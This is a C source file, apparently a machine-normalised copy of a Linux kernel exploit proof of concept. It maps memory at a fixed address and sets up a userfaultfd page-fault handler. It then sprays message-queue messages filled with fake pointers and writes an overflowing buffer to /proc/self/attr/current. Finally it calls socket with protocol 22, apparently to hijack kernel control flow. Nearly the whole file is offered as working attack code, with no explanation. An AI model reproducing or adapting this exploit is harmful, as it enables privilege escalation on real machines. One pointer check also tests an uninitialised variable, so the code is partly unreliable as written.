
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


typedef int pthread_t ;
struct TYPE_3__ {int mtype; scalar_t__ mtext; } ;


 int AF_INET ;
 int IPC_CREAT ;
 int IPC_PRIVATE ;
 int MAP_ANON ;
 int MAP_FIXED ;
 int MAP_PRIVATE ;
 int O_RDWR ;
 int PROT_READ ;
 int PROT_WRITE ;
 int close (int) ;
 int exit (int) ;
 int getpid () ;
 scalar_t__ mmap (void*,int,int,int,int,int ) ;
 TYPE_1__ msg ;
 int msgget (int ,int) ;
 int msgsnd (int,TYPE_1__*,int,int ) ;
 int open (char*,int ) ;
 int perror (char*) ;
 int printf (char*,int) ;
 int setup_pagefault (void*,int,int) ;
 int socket (int,int ,int ) ;
 int write (int,char*,int) ;

int main(int argc, char **argv) {
 void *region, *map;
 pthread_t uffd_thread;
 int uffd, msqid, i;

 region = (void *)mmap((void *)0x40000000, 0x2000, PROT_READ|PROT_WRITE,
                               MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);

 if (!region) {
  perror("mmap");
  exit(2);
 }

 setup_pagefault(region + 0x1000, 0x1000, 1);

 printf("my pid = %d\n", getpid());

 if (!map) {
  perror("mmap");
 }


 unsigned long *p = (unsigned long *)msg.mtext;
 for (i = 0; i < 6; i++) {
  *p ++ = 0x0000000040000000 + 0x1000 - 88;
 }
 msg.mtype = 1;

 msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);

 for (i = 0; i < 320; i++) {
  if (msgsnd(msqid, &msg, 48, 0) == -1) {
   perror("msgsnd");
   return -1;
  }
 }

 char buf[96];
 p = (unsigned long *)buf;

 for (i = 0; i < 11; i++) {
  *p ++ = 0x40000000 + 0x1000 - 88;
 }
 *p ++ = 0xfffffffffffffff;

 int fd = open("/proc/self/attr/current", O_RDWR);
 write(fd, buf, 96);


 msgsnd(msqid, &msg, 48, 0);
 msgsnd(msqid, &msg, 48, 0);
 msgsnd(msqid, &msg, 48, 0);

 socket(22, AF_INET, 0);

 close(fd);
 return 0;
}
